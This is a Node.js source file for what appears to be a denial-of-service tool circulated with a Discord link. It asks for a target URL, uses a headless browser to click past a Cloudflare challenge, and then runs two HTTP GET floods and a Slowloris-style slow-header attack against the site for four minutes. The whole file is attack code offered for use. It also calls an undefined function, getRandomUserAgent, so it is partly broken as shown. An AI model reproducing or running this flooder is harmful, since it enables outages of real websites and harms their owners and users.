const http = require('http');
const https = require('https');
const net = require('net');
const readline = require('readline');
const puppeteer = require('puppeteer');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log("discord >> https://discord.gg/JD9K97MJKx");
console.log("");
console.log("[?] Put (https://) or (http://) first.");
console.log("");

rl.question('url website > ', async (url) => {
    const sleep = (milliseconds) => new Promise(resolve => setTimeout(resolve, milliseconds));
    const targetUrl = url;
    const socketConnections = 600;
    const threads = 18;
    const attackDurationSeconds = 240;

    const browsers = [
        'Chrome', 'Firefox', 'Safari', 'Opera', 'Edge', 'Falkon', 'UPX'
    ];

    // Updated, new devices.
    const operatingSystems = [
        'Windows NT 10.0', 'Windows NT 6.3', 'Windows NT 6.1', 'Windows NT 6.0',
        'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 10_14_6',
        'Macintosh; Intel Mac OS X 10_13_6', 'Linux x86_64', 'Linux i686', 'Linux armv7l',
        'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 5.0', 'Windows NT 4.0',
        'Macintosh; Intel Mac OS X 10_12_6', 'Macintosh; Intel Mac OS X 10_11_6',
        'Macintosh; Intel Mac OS X 10_10_5', 'Android 11', 'Android 10', 'Android 9',
        'iPhone OS 14_0', 'iPhone OS 13_0', 'iPhone OS 12_0', 'Chrome OS 91', 'Ubuntu 20.04',
        'Fedora 32', 'Debian GNU/Linux 10', 'Arch Linux', 'FreeBSD 12', 'OpenBSD 6.7',
        'CentOS 7', 'Raspbian 10', 'Suse Linux Enterprise Server 15', 'Red Hat Enterprise Linux 8'
    ];
    
    function getagent() {
        const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
        const randomOS = operatingSystems[Math.floor(Math.random() * operatingSystems.length)];
        const version = Math.floor(Math.random() * 100) + 1;
        return `Mozilla/5.0 (${randomOS}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}/${version}.0`;
    }

    async function cloud(page) {
        const isCloudflare = await page.evaluate(() => {
            return document.getElementById('cf-wrapper') !== null;
        });

        if (isCloudflare) {
            const bypassButton = await page.evaluate(() => {
                const button = document.querySelector('button[id^="cf-"]');
                return button ? button.id : null;
            });

            if (bypassButton) {
                await page.waitForSelector(`#${bypassButton}`);
                await page.click(`#${bypassButton}`);
                await page.waitForNavigation({ waitUntil: 'networkidle2' });
            } else {
                console.error('Cloudflare.Bypasser: Button ID not found?');
                await sleep(2500);
            }
        }
    }

    async function attack(protocol) {
        const transport = protocol === 'https' ? https : http;
        const startTime = Date.now();
        const endTime = startTime + (attackDurationSeconds * 1000);

        const browser = await puppeteer.launch({ headless: true });
        const page = await browser.newPage();
        await page.setUserAgent(getagent());
        await page.goto(targetUrl, { waitUntil: 'networkidle2' });
        await cloud(page);

        console.log("SocT v1.3 by vzexg-2 / sxc_qq1");
        console.log("");

        const timerId = setInterval(async () => {
            if (Date.now() < endTime) {
                for (let i = 0; i < threads; i++) {
                    for (let j = 0; j < socketConnections / threads; j++) {
                        const options = {
                            hostname: new URL(targetUrl).hostname,
                            port: new URL(targetUrl).port || (protocol === 'https' ? 443 : 80),
                            path: new URL(targetUrl).pathname,
                            method: 'GET',
                            headers: {
                                'User-Agent': getRandomUserAgent(),
                            }
                        };

                        const req = transport.request(options, (res) => {
                            if (res.statusCode === 200) {
                                console.log("\x1b[32m[+] Attack successful!");
                            } else {
                                console.log("\x1b[31m[!] Attack failed. Status Code:", res.statusCode);
                            }
                        });

                        req.on('error', (error) => {
                            console.log("\x1b[31m[!] Attack failed. Reason:", error.message);
                        });

                        req.end();
                    }
                }
            } else {
                clearInterval(timerId);
                console.log("Attack finished. Time reached limit, You can edit the timer by editing this file.");
                await browser.close();
                rl.close();
            }
        }, 100);
    }

    async function sll() {
        const startTime = Date.now();
        const endTime = startTime + (attackDurationSeconds * 1000);
        const targetHostname = new URL(targetUrl).hostname;
        const targetPort = new URL(targetUrl).port || 80;

        const timerId = setInterval(() => {
            if (Date.now() < endTime) {
                for (let i = 0; i < threads; i++) {
                    const socket = net.connect(targetPort, targetHostname);

                    socket.on('connect', () => {
                        socket.write(`GET / HTTP/1.1\r\nHost: ${targetHostname}\r\n`);
                        socket.write(`User-Agent: ${getRandomUserAgent()}\r\n`);
                        socket.write(`Keep-Alive: timeout=1, max=1000\r\n`);
                        socket.write('\r\n');
                    });

                    socket.on('error', (error) => {
                        console.log("\x1b[31m[!] attack failed. Reason:", error.message);
                    });
                }
            } else {
                clearInterval(timerId);
                console.log("attack finished. Time limit reached.");
                rl.close();
            }
        }, 100);
    }

    async function fla(protocol) {
        const transport = protocol === 'https' ? https : http;
        const startTime = Date.now();
        const endTime = startTime + (attackDurationSeconds * 1000);

        const timerId = setInterval(async () => {
            if (Date.now() < endTime) {
                for (let i = 0; i < threads; i++) {
                    for (let j = 0; j < socketConnections / threads; j++) {
                        const options = {
                            hostname: new URL(targetUrl).hostname,
                            port: new URL(targetUrl).port || (protocol === 'https' ? 443 : 80),
                            path: new URL(targetUrl).pathname,
                            method: 'GET',
                            headers: {
                                'User-Agent': getRandomUserAgent(),
                            }
                        };

                        const req = transport.request(options, (res) => {
                            if (res.statusCode === 200) {
                                console.log("\x1b[32m[+] Attack successful!");
                            } else {
                                console.log("\x1b[31m[!] Attack failed. Status Code:", res.statusCode);
                            }
                        });

                        req.on('error', (error) => {
                            console.log("\x1b[31m[!] Attack failed. Reason:", error.message);
                        });

                        req.end();
                    }
                }
            } else {
                clearInterval(timerId);
                console.log("HTTP Flood Attack finished. Time reached limit.");
                rl.close();
            }
        }, 100);
    }

    function runAttacks() {
        const httpsProtocol = targetUrl.startsWith('https://');
        attack(httpsProtocol ? 'https' : 'http');
        fla(httpsProtocol ? 'https' : 'http');
        sll();
    }

    runAttacks();
});
